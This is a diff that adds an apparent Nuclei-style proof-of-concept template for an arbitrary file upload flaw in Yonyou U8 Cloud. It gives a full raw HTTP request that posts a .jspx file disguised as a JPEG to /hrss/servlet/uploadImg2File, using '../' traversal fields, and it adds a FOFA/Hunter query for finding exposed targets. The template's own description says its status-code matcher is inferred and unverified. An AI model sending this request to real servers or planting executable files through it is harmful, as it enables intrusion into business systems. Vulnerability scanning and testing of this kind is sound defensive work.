@@ -1,0 +1,83 @@
+id: poc-4ca475624efd6ccba3b8
+info:
+  name: 用友U8ClouduploadImg2File任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4ca475624efd6ccba3b83fe14b4e8528
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 4ca475624efd6ccba3b83fe14b4e8528
+    fofa: + hunter`app.name="用友 U8 Cloud"`
+http:
+- raw:
+  - 'POST /hrss/servlet/uploadImg2File HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 651
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: multipart/form-data;    boundary=----WebKitFormBoundary6veAfRuWsMCxTodB
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+
+    Cookie: JSESSIONID=882076295B79AA8C024D8F4FC5DDFF97.server; JSESSIONID=C717FE1B698660C55A9897A4D6A41177.server
+
+    Connection: close
+
+
+    ------WebKitFormBoundary6veAfRuWsMCxTodB
+
+    Content-Disposition: form-data; name="x"
+
+
+    ../
+
+    ------WebKitFormBoundary6veAfRuWsMCxTodB
+
+    Content-Disposition: form-data; name="y"
+
+
+    ../
+
+    ------WebKitFormBoundary6veAfRuWsMCxTodB
+
+    Content-Disposition: form-data; name="w"
+
+
+    ../
+
+    ------WebKitFormBoundary6veAfRuWsMCxTodB
+
+    Content-Disposition: form-data; name="h"
+
+
+    ../
+
+    ------WebKitFormBoundary6veAfRuWsMCxTodB
+
+    Content-Disposition: form-data; name="txtFileName"; filename="stc.jspx"
+
+    Content-Type: image/jpeg
+
+
+    123
+
+    ------WebKitFormBoundary6veAfRuWsMCxTodB--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
